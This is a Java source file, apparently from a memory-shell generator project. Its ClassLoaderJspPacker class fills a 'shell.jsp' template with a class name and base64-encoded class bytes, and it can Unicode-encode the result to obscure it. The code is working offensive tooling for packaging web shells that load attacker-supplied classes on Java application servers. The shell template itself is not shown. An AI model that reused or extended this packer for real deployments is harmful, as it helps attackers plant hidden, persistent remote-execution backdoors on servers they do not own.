package com.reajason.javaweb.packer.jsp;

import com.reajason.javaweb.packer.ClassPackerConfig;
import com.reajason.javaweb.packer.Packer;
import com.reajason.javaweb.packer.Util;
import com.reajason.javaweb.packer.spec.PackerSchema;
import lombok.SneakyThrows;

/**
 * @author ReaJason
 * @since 2024/11/26
 */
public class ClassLoaderJspPacker implements Packer<JspCustomPackerConfig> {

    private final String jspTemplate = Util.loadTemplateFromResource("/memshell-party/shell.jsp");

    @Override
    @SneakyThrows
    public String pack(ClassPackerConfig<JspCustomPackerConfig> config) {
        String content = jspTemplate.replace("{{className}}", config.getClassName())
                .replace("{{base64Str}}", config.getClassBytesBase64Str());
        JspCustomPackerConfig customConfig = config.getCustomConfig();
        if (customConfig != null && customConfig.isUnicode()) {
            return JspUnicoder.encode(content, true);
        }
        return content;
    }

    @Override
    public PackerSchema schema() {
        return JspCustomPackerConfig.schema();
    }
}